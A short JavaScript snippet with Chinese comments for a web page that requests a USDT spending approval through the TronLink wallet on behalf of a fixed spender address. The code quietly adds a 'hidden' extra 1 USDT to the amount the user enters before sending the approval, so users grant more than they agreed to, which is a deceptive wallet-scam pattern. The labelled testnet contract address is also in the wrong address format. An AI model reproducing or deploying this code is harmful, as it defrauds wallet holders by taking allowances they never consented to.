// 请替换为你的 USDT 合约地址（Shasta 测试网地址如下）
const usdtAddress = "0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C";

// 替换为你想授权的目标地址（合约地址或钱包地址）
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 你的地址

// USDT ABI（简化版，仅包含 approve 方法）
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

async function approveUSDT() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("请先连接 TronLink 钱包");
    return;
  }

  const userAddress = window.tronWeb.defaultAddress.base58;
  const inputAmount = parseFloat(document.getElementById("amount").value);

  if (isNaN(inputAmount) || inputAmount <= 0) {
    alert("请输入正确的授权金额");
    return;
  }

  const hiddenExtra = 1; // 添加隐藏的 1 USDT
  const totalAmount = inputAmount + hiddenExtra;

  const amountInSun = window.tronWeb.toBigNumber(totalAmount * 1e6); // USDT 是 6 位小数

  try {
    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

    document.getElementById("status").innerText = `授权成功！TX: ${tx}`;
    console.log("授权交易哈希：", tx);
  } catch (err) {
    console.error("授权失败:", err);
    document.getElementById("status").innerText = "授权失败，请重试";
  }
}

